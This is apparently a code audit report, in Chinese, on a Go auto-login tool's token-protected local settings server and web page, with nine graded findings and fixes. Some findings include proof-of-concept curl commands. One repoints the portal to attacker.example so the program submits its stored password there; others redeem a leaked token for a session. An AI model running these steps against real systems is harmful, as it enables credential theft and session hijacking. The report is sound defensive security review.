# B：本地设置服务与 Web 页面审查报告

审查对象：`internal/app/settings.go`、`internal/app/appstate.go`、`internal/app/payload.go`、
`internal/webui/webui.go`、`internal/webui/assets/{index.html,app.js,app.css}`、
`internal/i18n/i18n_web.go` 及相关测试。
本机**无 Go 工具链**（Windows 与 WSL 均无 `go`），因此**未运行 `go build` / `go vet` / `go test`**；
下文每条结论都只来自源码逐行阅读，凡不能从代码确认的一律标注「无法验证」。

---

## 摘要

- **认证模型比通行做法更严**：一次性 entry token（URL query）→ 换发会话 cookie（`SameSite=Strict`、非 `HttpOnly`）→ 写操作**另需** `X-Auth-Token` 自定义头。三者缺一不可。
- **路由 6 条，全部要求有效会话 cookie；「无需 token 即可访问」的内容路径 = 0 条**。未认证调用只能读到 `403`/`404`/`405` 三种空响应。
- **未发现 S0/S1**。理由：entry token 为 16 字节 `crypto/rand`（128 bit）、一次性、用 `subtle.ConstantTimeCompare` 比较；写操作要求自定义头，跨源预检不可通过；cookie `SameSite=Strict` 且是 host-only，DNS rebinding 拿不到会话；CSP 为 `script-src 'self'` 且无 `unsafe-inline`。
- **前端 DOM 注入面 = 0 处可利用**。全站只有 3 处 `innerHTML`，全部是清空操作（`= ""`）；所有服务端可控字符串（门户应答、日志行、错误消息）都经 `textContent` / `el(..., {text})` 落地；无 `eval` / `new Function` / `document.write` / `insertAdjacentHTML` / 字符串 `setTimeout`。
- **最重的 3 条 S2** 集中在两处：(1) entry token 被写进日志并在页面上显示，使「一次性、不留痕」的设计承诺失效；(2) 设置页 API 允许把门户地址改到任意主机后让程序**把存储的密码提交过去**（凭据外泄链）；(3) `--settings=ADDR` 对外监听模式无 TLS、cookie 无 `Secure`、无 Host/Origin 校验。
- 严重度分布：**S0 0 条，S1 0 条，S2 3 条，S3 4 条，S4 2 条**，合计 **9 条**。

---

## 路由与 token 机制清单

### 路由全清单（`internal/app/settings.go:307-319` 的 `routes()`）

| # | 方法 | 路径 | 认证要求 | 读 | 写 / 副作用 |
|---|---|---|---|---|---|
| 1 | 任意方法（仅 `/` 有内容） | `/`（catch-all；其它路径**先** 404，见 `settings.go:417-420`） | `?token=` == entry **或** cookie；非 GET 还需 `X-Auth-Token` | query `token`、cookie | 设 `sdauth` cookie（`settings.go:451-459`）、**滚动掉 entry token**（`settings.go:446`）、`303 → /`；通过则返回 `index.html` |
| 2 | GET/HEAD | `/static/*` | cookie；非 GET 需 `X-Auth-Token` | 路径 | 从 `embed.FS` 返回 `app.js`/`app.css`/`logo.svg`/`index.html`（`settings.go:349-358`） |
| 3 | GET | `/api/bootstrap` | cookie | query `lang`（只接受 `zh`/`en`，`settings.go:470-473`） | 无。读取并返回版本、i18n 全表、**掩码后的**配置、状态、autostart、配置/日志路径、`config.Operators` |
| 4 | GET | `/api/status` | cookie | 无 | 无。返回 `statusPayload` + `autostart` |
| 5 | POST | `/api/config` | cookie **+** `X-Auth-Token` | JSON body（≤64 KiB） | **写配置**：`state.Update(next)` → `Save()` 落盘、`i18n.SetLang`、`Log.SetVerbose`、`svc.Restart` 重启检测循环（`settings.go:566`、`appstate.go:156-181`） |
| 6 | POST | `/api/action` | cookie **+** `X-Auth-Token` | JSON body（≤16 KiB） | 12 个动作：`check`（立即触发一次检测）、`testLogin`（**向门户提交一次登录**，含存储的密码）、`switchService`（**替换门户上的会话**）、`reload`（重读 config.json 并应用）、`openConfig`（`ShellExecuteW` 打开配置文件）、`openLog`（打开日志文件）、`openPortal`（`ShellExecuteW` 打开配置里的 URL）、`checkUpdate`（向发布页发请求）、`logTail`（**读取整个日志文件**）、`autostart`（写开机自启项）、`quit`（退出程序） |

- 全部 6 条路由都先经过 `withHeaders`（`settings.go:363-372`）与 `withWriteDeadline`（`settings.go:329-340`），再进入上述鉴权。
- **无 token 即可访问的路径：0 条。** 未认证调用能得到的是：`/` 上的 `403`（`settings.go:433`）、任意未注册路径的 `404`（`settings.go:418`，**在鉴权之前**返回）、`/api/config`、`/api/action` 上非 POST 的 `405`（`settings.go:529`、`settings.go:596`，同样在鉴权之前）。这三者都不含任何数据。

### token 机制逐行审查

| 问题 | 结论 | 依据 |
|---|---|---|
| 熵源 / 长度 | `crypto/rand` 16 字节 → 32 位十六进制（128 bit） | `settings.go:298-304` |
| 生成时机 / 轮换 | 每次 `URL()`（即服务启动）全新生成 **entry + session 两个**；每次打开页面 `rollEntry()` 再换一次 entry；每次成功换 cookie（`startSession`）又换一次 | `settings.go:132-139`、`184-198`、`442-450` |
| 存储 | entry/session 只存在 `Server` 结构体内存里（`settings.go:86,90`），不落盘 | `settings.go:79-92` |
| 比较 | `subtle.ConstantTimeCompare`，且 `want == ""` 直接拒绝（空 token 匹配不了任何东西） | `settings.go:409-414` |
| 有效期 | entry token 活到「下一次 `rollEntry()`」或「`Stop()`」（空闲 15 分钟由 `reapWhenIdle` 关闭服务） | `settings.go:27`、`280-296`、`267-276` |
| 失败限速 / 锁定 | **没有任何限速、计数或锁定**；失败只在 verbose 模式下写一行 Debug 日志 | `settings.go:377-404`，`logging/log.go:184-188` |
| token 是否进日志 | **是**——见发现 [S2-1] | `settings.go:196`、`167` |
| 是否接受 `Referer`/`Origin` 之外的来源 | 不校验 `Origin`/`Referer`/`Host`（全仓库 grep 无命中）；跨源防护完全依赖 cookie 的 `SameSite=Strict` + 写操作的自定义头 | 见发现 [S3-1]、[S3-4] |
| 可否用 `Authorization` 头替代 | 写操作已经用了等价的自定义头 `X-Auth-Token`（`settings.go:398`）；GET 端点靠 cookie，因为浏览器首次导航无法加头。改用 `Authorization` 不会更安全，只会多一个自由度 | `settings.go:395-403` |

---

## 发现

### [S2-1] entry token 被写进日志，并被设置页自己显示出来——「一次性令牌不留痕」的设计承诺不成立

- 类别：信息泄漏 / 认证
- 位置：`internal/app/settings.go:196`（并见 `:167`）、`internal/app/settings.go:712-713`、`internal/webui/assets/app.js:1159-1167`
- 证据：
  ```go
  // settings.go:184-198
  s.entry = entry
  s.url = urlFor(s.bound, entry)
  url := s.url
  s.mu.Unlock()
  logging.Log.Info("settings page at %s", url)   // url 里带 ?token=<32位十六进制>
  ```
  ```js
  // app.js:1165
  $("logTail").textContent = res.data.lines.join("\n");
  ```
- 攻击路径：
  1. 任何能读到日志的路径（日志被收集/上报、被截图、被贴进 issue；同用户权限的进程）。日志默认写文件：`config.go:145 LogToFile: true`，`cmd/SDAutoLogin/main.go:37 logging.Log.Init(filepath.Join(appDir,"logs"), !opts.noLog)`。
  2. 在日志里找最新的一行 `settings page at http://127.0.0.1:PORT/?token=…`。**这一行里的 token 是最新的、仍然有效的那个**：`open()` → `rollEntry()` 记下 T2 并把 T2 交给浏览器；浏览器带着 T2 访问 `/` → `startSession()` 再 `rollEntry()` 生成 T3 并记下 T3。T2 已作废，**T3 从未被交给任何浏览器，却是活的**，而它就躺在日志里。
  3. 取用：
     ```bash
     curl -i "http://127.0.0.1:PORT/?token=T3"      # → 303 + Set-Cookie: sdauth=<session>
     curl -s -b "sdauth=<session>" http://127.0.0.1:PORT/api/bootstrap   # 完整配置（密码已掩码）+ 状态 + 日志路径
     ```
  4. 设置页自己的 About 标签也会把这行日志显示在屏幕上（`app.js:1156 switchTab("about") → loadLogTail()`），而 i18n 文案 `i18n_web.go:186 msg.stale` 还在**教用户去日志里找最新地址**：「请从托盘重新打开，或打开日志里最新的那个地址。」
- 影响：机密性 + 完整性。把「必须在内存/URL 里被交付的秘密」变成「可从持久化产物里恢复的秘密」，可让读到日志的一方获得完整会话权限（读配置、改配置、提交门户登录、退出程序）。**非持久**（entry token 在下一次打开页面或空闲 15 分钟关服后失效）。与设计注释 `settings.go:83-89`「nothing the page is left showing carries it」和 `i18n_web.go:180 about.security` 的表述直接矛盾。
- 修复：不要记录带 token 的 URL——把 `logging.Log.Info("settings page at %s", url)` 改成只记 `s.bound.String()`（或 host:port），需要告诉用户「去哪里打开」时用托盘气泡/页面内提示，不用 URL。另可给 `logTail` 增加一行脱敏（把 `token=[0-9a-f]{32}` 替换成 `token=…`），并把这个脱敏放进 `tailLog`（`settings.go:745-759`）而不是前端。
- 置信度：高（日志行内容与 `rollEntry` 调用顺序均可从代码逐行确认；「日志被谁读到」取决于部署，故严重度定 S2 而非 S1）。

### [S2-2] token 持有者可把门户地址改到自己的主机，再让程序把存储的密码提交过去

- 类别：认证 / 授权 / 信息泄漏（凭据外泄链）
- 位置：`internal/app/settings.go:527-576`（`handleConfig`）、`internal/app/settings.go:626-642`（`testLogin`）、`internal/app/appstate.go:200-213`（`TestLogin`）、`internal/config/config.go:560-566`（`marshal`）、`config.go:598-627`（`KeepPasswordsFrom`）、`config.go:226-269`（`loadPasswords`）
- 证据：
  ```go
  // settings.go:541-542、554、566
  next := s.state.Config().PageBase()
  if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 64<<10)).Decode(next); err != nil {
  if notice := next.ReconcilePasswords(s.state.Config()); notice != "" {
  if err := s.state.Update(next); err != nil {
  ```
  ```go
  // appstate.go:200-212
  func (a *AppState) TestLogin(attempt config.Attempt) LoginTest {
      cfg := a.Config()
      client := portal.NewClient(cfg)
      before := client.QueryStatus()
      ...
      Result: client.Login(before, attempt),
  ```
  ```go
  // config.go:612-614：请求里留空的密码，从「运行中那份配置」继承
  if i < len(stored.Accounts) && !inherited[i] && sameAccount(stored.Accounts[i], c.Accounts[i]) {
      inherited[i] = true
      c.Accounts[i].Password = stored.Accounts[i].Password
  ```
  而 `PortalBaseURL` 只要求 scheme 是 http/https、host 非空，**不限主机**：`config.go:723-729` → `ValidHTTPURL`（`config.go:736-742`：`(u.Scheme == "http" || u.Scheme == "https") && u.Host != ""`）。
- 攻击路径（前置：拿到会话 cookie + `X-Auth-Token`，例如经由 [S2-1]）：
  ```bash
  S=<session>; P=127.0.0.1:PORT
  # 1) 把门户指向自己的主机；password 留空 → 服务端 KeepPasswordsFrom 会把存储的密码填回来
  curl -s -X POST "http://$P/api/config" -H "Cookie: sdauth=$S" -H "X-Auth-Token: $S" \
       -H "Content-Type: application/json" -d '{"accounts":[{"username":"s1234567","password":"","isps":[""]}],
       "rememberPassword":true,"portalBaseUrl":"http://attacker.example/",
       "eportalUrl":"http://attacker.example/eportal/","checkIntervalSeconds":5,"httpTimeoutSeconds":5}'
  # 2) 让程序自己去登录：真实密码被 user_account/password 参数送到 attacker.example
  curl -s -X POST "http://$P/api/action" -H "Cookie: sdauth=$S" -H "X-Auth-Token: $S" \
       -H "Content-Type: application/json" -d '{"action":"testLogin","index":0}'
  ```
  同理 `{"action":"check"}`（`settings.go:621-624`）会让后台循环自己反复提交。对「密码存在密码文件里、config.json 不含密码」的部署（更安全的部署）同样成立：`loadPasswords` 会用 `PasswordFile`（该字段在 `PageBase()` 克隆里被保留）重新读回密码并标记 `SourceFile`（`config.go:239-247`）。
  附带后果 A：把 `passwordFile` 改成任意路径即可让程序读该文件的一行进 `Accounts[0].Password`（`config.go:231-247`），再经上面的 `testLogin` 外送——成为「读任意本地文件一行」的原语。
  附带后果 B：`probeUrls` 可设为任意地址，`statusPayload` 会把 `internetChecked`/`internetOk` 回给页面（`payload.go:82-83`、`settings.go:565`），构成一个内网可达性探测 oracle。
- 影响：机密性（校园网凭据被外送，且**持久**——配置已改，后续每次检测都会向攻击者主机提交）；完整性（配置被改写、检测循环被重启）。
- 修复：`handleConfig` 不应接受**跨主机**的 `PortalBaseURL`/`EportalURL` 变更而不做二次确认；最小可行改法是把这两个地址与 `PasswordFile` 一起列为「需要重新认证/需要本机确认」的字段——例如仅当请求来自 `127.0.0.1` 的字面来源（配合 [S3-1] 的 Host 校验）才允许改动，或者在改动这两个字段时要求 `PasswordFile` 指纹或一次性口令。此外 `testLogin` 应拒绝向「与上次保存时不同的主机」提交。
- 置信度：中高。代码链条（decode → ReconcilePasswords 继承密码 → Update 落盘 → `portal.NewClient(cfg)` 用新地址）逐行可确认；**无法验证**的是端到端实际外送（无 Go 工具链、无法起本地门户验证）。

### [S2-3] `--settings=ADDR` 对外监听模式：明文 HTTP、cookie 无 `Secure`、无 Host/Origin 校验，告警只写进日志

- 类别：认证 / 跨源 / 信息泄漏
- 位置：`internal/app/settings.go:140`、`164-167`、`451-459`；`cmd/SDAutoLogin/cli.go:117`、`166-170`；`cmd/SDAutoLogin/main.go:135`
- 证据：
  ```go
  // cli.go:117
  --settings=ADDR     also serve the settings page on ADDR, for example
  ```
  ```go
  // settings.go:140 / 164-166
  listener, err := net.Listen("tcp", addr)
  ...
  if host, _, err := net.SplitHostPort(listener.Addr().String()); err == nil && !isLoopback(host) {
      logging.Log.Warn("the settings page is reachable from the network on %s; the token in its address is the only protection, so keep it on a trusted network or behind a tunnel", listener.Addr())
  }
  ```
  ```go
  // settings.go:451-459：无 Secure，注释承认「服务端说的是明文 http」
  http.SetCookie(w, &http.Cookie{
      Name: sessionCookie, Value: session,
      Path: "/", SameSite: http.SameSiteStrictMode,
      // Not Secure, and not HttpOnly: ...
  })
  ```
- 攻击路径：运维按文档以 `--settings=0.0.0.0:8080` 启动（remote management）→ 局域网内任一能观察流量的节点（同网段嗅探、ARP 欺骗、上游 Wi-Fi 网关）从**任意一条** `GET /?token=…` 请求里读走 entry token → 再 `curl` 一次即得会话 cookie；此后可读 `/api/bootstrap`（配置全文、日志路径、掩码后的密码来源）、可 POST 改配置、可 `{"action":"quit"}` 结束程序。同一条链上，用户在表单里敲的门户密码也是明文过网。
- 影响：机密性 + 完整性 + 可用性；对该配置是**实质失陷**（可视为 S1），但它需要运维显式开启非默认配置，且代码自带一句告警，故定 S2。
- 修复：`--settings` 非回环时只允许两种收尾——(1) 拒绝启动并给出明确错误；(2) 提供 TLS（`crypto/tls` + 自签证书）并据此给 cookie 加 `Secure`。至少要给非回环模式加 `Host` 白名单（见 [S3-1]）并把告警同时打到 stderr/托盘提示，而不是只进日志。
- 置信度：高（`net.Listen` 直接使用运维给的地址；cookie 无 `Secure` 可从 `settings.go:451-459` 逐字确认）。

---
### [S3-1] 没有 `Host` 头校验——结论：DNS rebinding 当前不能取得会话，但防护是「偶然成立」的

- 类别：跨源 / 加固
- 位置：`internal/app/settings.go:307-319`（`routes()`）、`377-404`（`authorised`）、`416-437`（`handleIndex`）
- 证据：全仓库对 `r.Host` / `req.Host` 的检索**零命中**；`authorised` 只做两件事：
  ```go
  // settings.go:379-403
  cookie, err := r.Cookie(sessionCookie)
  if err != nil { ... return false }
  s.mu.Lock(); session := s.session; s.mu.Unlock()
  if !tokenEqual(cookie.Value, session) { ... return false }
  if r.Method == http.MethodGet { return true }
  if !tokenEqual(r.Header.Get("X-Auth-Token"), session) { ... return false }
  ```
- 明确结论（逐条回答任务问题 4）：
  1. **handler 完全不校验 `Host`**，`settings.go` 里没有任何 `127.0.0.1`/`localhost` 白名单。
  2. 因此 `evil.example`（TTL 0 重新解析到 `127.0.0.1`）的页面**可以**让自己的 JS 同源地读写 `http://evil.example:PORT/...`，服务端也会正常应答。
  3. **但它拿不到会话**：`sdauth` cookie 是 host-only（`urlFor` 用 `127.0.0.1`/运维填的地址，`settings.go:202-224`；`Set-Cookie` 未设 `Domain`），浏览器不会把它发给 `evil.example`，请求落在 `settings.go:432-435` 的 `403`。
  4. 加上写操作要求自定义头 `X-Auth-Token`（跨源必然触发预检，而服务端不返回任何 CORS 头），GET 端点又全是只读的，所以**当前没有可利用的 rebinding 路径**。
  5. 反面风险：这个「偶然成立」依赖 cookie 的 host-only 属性。一旦有人给 cookie 加 `Domain`、把 `urlFor` 的 host 改成可配置名字、或运维用主机名访问（`http://mypc.local:8080`），rebinding 立刻变成完整的会话劫持。同理，若将来新增不依赖 cookie 的端点，也会立刻暴露。
- 影响：当前无直接影响（加固缺失）；在 [S2-3] 的对外监听模式下风险显著放大。
- 修复：在 `withHeaders` 之前加一层中间件：`host, _, err := net.SplitHostPort(r.Host)`，要求 `isLoopback(host)` 或与 `listener.Addr()` 的字面 host 相等，否则 `403`。`isLoopback` 已经存在（`settings.go:227-235`），可直接复用。
- 置信度：高（无校验为可证事实）；「DNS rebinding 拿不到 cookie」依据的是浏览器 cookie 作用域规则，**无法在本机验证**（无浏览器、无法起服务）。

### [S3-2] `/static/*` 没有 `Cache-Control: no-store`，与 `serveAsset`/`writeJSONStatus` 的做法不一致

- 类别：加固 / 架构
- 位置：`internal/app/settings.go:349-358`（`assets()`）对照 `763-772`（`serveAsset`）与 `778-783`（`writeJSONStatus`）
- 证据：
  ```go
  // settings.go:761-770
  // serveAsset writes one file of the embedded settings page. Caching is off so
  // an updated page cannot be paired with an old executable's API.
  func serveAsset(w http.ResponseWriter, r *http.Request, name, contentType string) {
      ...
      w.Header().Set("Cache-Control", "no-store")
  ```
  ```go
  // settings.go:349-357：assets() 里没有同样的头部，直接交给 http.FileServer
  files := http.StripPrefix("/static/", http.FileServer(http.FS(webui.Assets())))
  return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
      if !s.authorised(r) { http.Error(w, "invalid or missing token", http.StatusForbidden); return }
      files.ServeHTTP(w, r)
  })
  ```
  实际后果限定：`//go:embed` 得到的文件 `ModTime()` 为零值，`http.ServeContent` 因此不会发出 `Last-Modified`/`ETag`，浏览器缺少可用的启发式新鲜度依据，所以「真的被缓存」的把握不大。
- 攻击路径：无直接攻击链；风险是版本错配（新 `app.js` + 旧二进制的 API，或反之）以及设置页脚本残留在浏览器缓存里。
- 影响：完整性（弱）；可用性（弱）。**无法验证**实际缓存行为（本机无浏览器、无 Go 工具链）。
- 修复：在 `assets()` 的包装函数里加 `w.Header().Set("Cache-Control", "no-store")`（一行），与 `serveAsset`/`writeJSONStatus` 对齐。
- 置信度：高（头部缺失是代码事实）；影响评级为低。

### [S3-3] `handleConfig` 信任请求体里的服务端自有字段 `accounts[].passwordSource`，可静默丢弃已存密码

- 类别：完整性 / 输入校验
- 位置：`internal/app/settings.go:541-542`；`internal/webui/assets/app.js:409-413`；`internal/config/config.go:210-216`、`560-566`
- 证据：
  ```go
  // settings.go:541-542：PageBase() 先把 source 清成 ""，随后 JSON 解码又可以把请求里的值写回去
  next := s.state.Config().PageBase()
  if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 64<<10)).Decode(next); err != nil {
  ```
  ```go
  // config.go:560-566：保存时以这个字段决定「要不要把密码写进文件」
  fromFile := c.Accounts[i].PasswordSource == SourceFile
  v.Accounts[i].PasswordSource = ""
  if !c.RememberPassword || fromFile {
      v.Accounts[i].Password = ""
  }
  ```
  ```js
  // app.js:409-413：页面刻意不把这个字段发回去
  function requestBody() {
    const body = collect();
    body.accounts.forEach((entry) => { delete entry.passwordSource; });
  ```
  且全仓库无 `json.Decoder.DisallowUnknownFields()`（grep 零命中），`Account.PasswordSource` 带 `json:"passwordSource,omitempty"` 标签（`config.go:36`），`SourceFile = "file"`（`config/passwordfile.go:15`）。
- 攻击路径：`curl -X POST /api/config -d '{"accounts":[{"username":"s1234567","password":"typed","passwordSource":"file","isps":[""]}], ...}'` → `marshal()` 认定该密码「来自密码文件」，于是**不写进 config.json**，同时把 `PasswordSource` 落成 `""`。下一次启动该条目没有密码，登录静默不再发生。
- 影响：完整性/可用性（**持久**：密码从磁盘配置中消失）。需要会话 cookie + `X-Auth-Token`，故定 S3；它破坏了「页面永远不写这个字段、服务端拥有该字段」的契约（`app.js:406-413` 的注释）。
- 修复：解码后在服务端把该字段重新清空，或把 `handleConfig` 的解码目标换成一个不含 `PasswordSource` 的请求结构体（DTO），并打开 `DisallowUnknownFields()`；同时给请求体加 `Content-Type: application/json` 校验（现在完全没有校验：`settings.go:542`、`615` 直接解码任何 Content-Type 的 body）。
- 置信度：高（机制可从 `marshal`/`PasswordSource` 逐行确认）；**无法验证**的是实际数据丢失（未跑测试）。

### [S3-4] 测试完全没有覆盖跨源 / Host / Content-Type / 非预期方法这些对抗性场景

- 类别：测试盲区
- 位置：`internal/app/settings_test.go:496-546`、`259-314`；全文件无 `t.Skip`（grep 零命中）
- 证据：
  ```go
  // settings_test.go:527-532：只断言 4 个安全头，没有 Cache-Control，也没有 Host/Origin 相关用例
  want := map[string]string{
      "Content-Security-Policy": contentSecurityPolicy,
      "X-Content-Type-Options":  "nosniff",
      "X-Frame-Options":         "DENY",
      "Referrer-Policy":         "no-referrer",
  }
  ```
- 已覆盖（值得肯定，且用的是**真实 TCP 监听**）：`startedServer` 调 `NewServer(state, addr, nil)` + `server.URL()` → 真实 `net.Listen`（`settings_test.go:29-41`），客户端用带 `cookiejar` 的 `http.Client`（`:45-53`）——因此中间件与监听层都在被测范围内，不是只测 handler 函数。已覆盖：无 cookie 被拒 403（`:72-94`）、`/static/*` 同样需要会话（`:101-138`）、token 换 cookie 且 `SameSite=Strict`（`:143-190`）、地址一次性（`:192-230`）、每次打开都换地址（`:232-257`）、**URL 里的 token 不能用于 API**（`:259-279`）、**写操作必须同时带 cookie 与头**（`:281-314`）、安全头（`:496-546`）、空 token 不匹配（`:548-571`）、被拒的保存不动运行中的配置（`:597-650`）、页面拿不到存储密码（`:681-737`）、门户地址就是配置里的那个（`:905-934`）。
- **没覆盖**：(a) 任何 `Host`/`Origin`/`Referer` 变体（跨源拒绝只靠 `X-Auth-Token` 间接体现）；(b) `OPTIONS`/`HEAD` 到 6 条路由的应答；(c) `Content-Type: text/plain` / `application/x-www-form-urlencoded` 的 POST（`settings.go:542`、`615` 不校验 Content-Type）；(d) 请求体里的 `passwordSource`（[S3-3]）；(e) `/static/*` 的 `Cache-Control`；(f) 任何并发保存/并发打开的竞态用例；(g) `handleIndex` 在非 `/` 路径上「鉴权前 404」的行为。
- 影响：这些盲区正好对应上面几条发现，意味着回归不会被告警。
- 修复：补 3 个表驱动用例即可：`Host: evil.example` + 有效 cookie 的期望；`POST /api/config` 带 `Content-Type: text/plain` 的期望；请求体含 `passwordSource:"file"` 后 `Accounts[0].Password` 的行为断言。
- 置信度：高（grep 与逐用例阅读）。

### [S4-1] 失败尝试完全无限速/无锁定（128 bit 令牌下不构成实际风险）

- 类别：认证 / 加固
- 位置：`internal/app/settings.go:377-404`、`298-304`
- 证据：`authorised` 里没有任何计数器或延时，只写一行 Debug；`randomToken` 为 16 字节 `crypto/rand`。
- 攻击路径：`for i in $(seq 1 100000); do curl -s "http://127.0.0.1:PORT/?token=$(printf %032d $i)"; done` — 需 2^128 次才能命中，不可行。
- 影响：无（记录的仅是加固缺失）。若将来把 token 改短或改成可猜格式，缺限速会立即变成真问题。
- 修复：在 `authorised` 失败分支加一个简单的按连接的令牌桶（每秒若干次）即可，不必锁定。
- 置信度：高。

### [S4-2] 会话 cookie 非 `HttpOnly`，前端用 `document.cookie` 读取并重复到请求头

- 类别：架构 / 加固
- 位置：`internal/webui/assets/app.js:7-15`、`internal/app/settings.go:451-459`
- 证据：
  ```js
  const TOKEN_COOKIE = "sdauth";
  function readToken() {
    const found = document.cookie.split("; ").find((part) => part.startsWith(prefix));
    return found ? found.slice(prefix.length) : "";
  }
  const token = readToken();
  ```
  ```go
  // Not Secure, and not HttpOnly: ... the page reads this one to repeat it in the header
  ```
- 攻击路径：若页面出现 XSS，`document.cookie` 直接给出会话令牌。当前 XSS 面基本为零（CSP `script-src 'self'`、无 `unsafe-inline`、无 `eval`、全站 `textContent`），所以这是纵深防御议题而非可利用漏洞。
- 影响：机密性（条件性：需先有 XSS）。
- 修复：把令牌改成「页面加载时由 bootstrap 响应体下发、只存在内存变量里」并弃用 cookie（`document.cookie` 就用不上了，cookie 也可顺手加 `HttpOnly`）。这是设计取舍，不是缺陷；此处只作记录。
- 置信度：高（代码事实）。

---
## 前端 DOM 注入面清单

`app.js` 全文 1532 行已逐行读完。检索命令：
`Select-String app.js -Pattern 'innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|new Function|setTimeout\(["\x27]|javascript:|\.src\s*=|\.href\s*='`

| file:line | 语句（逐字） | 可控输入 | 是否可利用 |
|---|---|---|---|
| `app.js:11` | `const found = document.cookie.split("; ").find((part) => part.startsWith(prefix));` | cookie（服务端设的 32 位十六进制） | 否（只读，不落 DOM） |
| `app.js:33-34` | `console.log("[sdautologin] " + what, detail)` | 调用方给的字符串（`accountsBrief` 只含账号名与 `password=set/empty`，见 `:418-422`；`:1082` 会打印门户 URL） | 否（只进控制台；**未发现任何把 token 写进 console 的位置**） |
| `app.js:63-78` | `el()`：`key.startsWith("on")` → `addEventListener`；其余 → `node.setAttribute(key, value)`；`key === "text"` → `node.textContent = value`；`key === "dataset"` → `Object.assign(node.dataset, value)` | 属性名全部是字面量；值里有服务端数据的地方走 `text`/`dataset` | 否（`setAttribute` 的属性名不可控；`text` 走 `textContent`；`dataset` 走 DOM 属性，无法从属性值里跳出去） |
| `app.js:163` | `list.innerHTML = "";` | 无 | 否（清空） |
| `app.js:1089` | `box.innerHTML = "";` | 无 | 否（清空） |
| `app.js:1171` | `select.innerHTML = "";` | 无 | 否（清空） |
| `app.js:1024` | `el("pre", { text: (res.data.result.raw \|\| "").trim() })` | **门户原始应答**（`portal.LoginResult.Raw`） | 否（`textContent`） |
| `app.js:1165` | `$("logTail").textContent = res.data.lines.join("\n");` | **日志行**（含门户应答文本、以及第 [S2-1] 条的带 token URL） | 否（`textContent`）；token 的**泄漏**另计为 [S2-1] |
| `app.js:556` | `field.textContent = up.installed ? up.message + " (" + up.installed + ")" : up.message;` | 更新器消息（版本号/文件路径/仓库返回） | 否（`textContent`） |
| `app.js:602-603` | `const reason = state.i18n["retcode." + why.retCode] \|\| why.message;` → `skipped.textContent = t("acct.skipped", ...)` | 门户消息 | 否（`textContent`） |
| `app.js:661-668` | `line.textContent = t("acct.preferred.refused", operatorName(select.value), reason)` / `t("acct.preferred.now", ...)` | 门户消息 + 服务类型后缀 | 否（`textContent`） |
| `app.js:720-731` | `notice.textContent = reason`（`st.message \|\| st.lastError`） | 门户/程序消息 | 否（`textContent`） |
| `app.js:827-841`、`869`、`887` | `target.slot.textContent = t(key)`、`toast()`→`node.textContent = text`、`$("confirmText").textContent = text` | 服务端错误键 + 账号名 | 否（`textContent`） |
| `app.js:1513` | `$("abRepo").href = data.repo;` | `data.repo` = `payload.go:16` 的常量 `Repo`（`https://git.zqlhub.com/zqlan/SDAutoLogin`） | 否（编译期常量，不是配置值；`<a>` 另有 `rel="noreferrer"`，`index.html:231`） |
| `index.html:307` | `<script src="/static/app.js"></script>` | 无（静态） | 否 |

- **条目数 15；判定可利用 = 0。**
- **没有出现**：`outerHTML`、`insertAdjacentHTML`、`document.write`、`eval(`、`new Function`、`setTimeout("字符串")`、`setInterval("字符串")`、`javascript:`、`.src =`、`localStorage`、`sessionStorage`（后两者 grep 零命中——令牌不落 Web Storage）。
- 支撑结论的 CSP（`settings.go:63-64`，由 `withHeaders` 对**所有**响应下发，含拒绝）：`default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'`；`TestEveryAnswerCarriesTheSecurityHeaders` 另外断言策略里不含 `unsafe-inline`（`settings_test.go:543-545`）。`index.html` 无任何内联脚本/内联样式（逐行读完 309 行）。
- URL 注入：把配置值或服务端返回值拼进 `href`/`src`/`fetch` 的位置只有 `abRepo.href`（常量）。`fetch` 的路径参数全是源码里的字面量（`app.js:570`、`933`、`962`、`988`、`1037`、`1071`、`1114`、`1160`、`1204`、`1226`、`1237`、`1253`、`1256`、`1261`），唯一带变量的是 `"/api/bootstrap?lang=" + encodeURIComponent(lang)`（`app.js:1114`），已编码且服务端再校验只允许 `zh`/`en`（`settings.go:470-473`）。
- 「打开日志目录 / 访问发布页」这类按钮：`openConfig`/`openLog`/`openPortal` 的 URL **由服务端决定**，页面只发动作名（`app.js:1252-1257`、`1069-1083`），不存在让页面指定 `javascript:` 的通道；服务端侧 `PortalBaseURL` 又被 `ValidHTTPURL` 限制为 http/https（`config.go:723-729`）。`platform.OpenExternal` 用 `ShellExecuteW` 单参数直传（`platform/openurl_windows.go:12-22`）、非 Windows 用 `exec.Command` 数组传参（`platform/openurl_other.go:12-21`），**不经过 shell 拼接**，因此没有命令注入面。
- 错误处理：失败时**不**渲染服务端原始错误或堆栈。页面只渲染 i18n 键（`err.badRequest`/`err.saveFailed`/`err.loadFailed`/`err.unknownAction`/`err.noUpdater`/`err.openPortal`）与 `config.Validate()` 的字段路径→键映射；服务端 `handleConfig` 也刻意不把值写进日志（`settings.go:578-592` 的 `describeErrors` 只拼字段路径与消息键）。

---

## 架构与设计层面问题

1. **令牌生命周期设计是「两条腿」的，但一条腿在日志里。** entry token 的设计意图（`settings.go:66-91`、`181-198`、`421-424`）是「交付一次即作废、不留在任何地方」。但 `rollEntry()` 在**每一次**滚动（包括 `startSession` 内部那次）都把新令牌写进日志（`:196`），于是滚动之后那个「谁都没见过」的令牌成了活的、且可读的秘密。评述：这不是单点代码错误，而是「日志=可对外收集的产物」与「令牌=只允许在内存里存在」两个假设的冲突；修法应选一个假设（[S2-1] 给了最小改法）。
2. **状态一致性：未发现撕裂读写。** `AppState.mu` 保护 `cfg`/`svc`/`started` 三个字段的换入换出（`appstate.go:19-24`、`90-94`、`156-181`）；所有读取者拿到的是**整份指针**，`Update` 是先 `next.Save()` 成功再在锁内换指针（`:157-172`），因此不存在「半新半旧」的配置。
   - 设置页与登录循环的竞态：`TestLogin`/`SwitchService` 在入口处 `cfg := a.Config()` 取一份快照，并用它构造 `portal.NewClient(cfg)`（`appstate.go:201-202`、`219-220`），所以正在进行的一次请求**全程使用它开始时那一版门户地址**，改配置不会让同一请求中途换主机——这是可接受（甚至更正确）的语义。`svc.Restart(next)` 也只在锁外调用（`appstate.go:174-179`）。
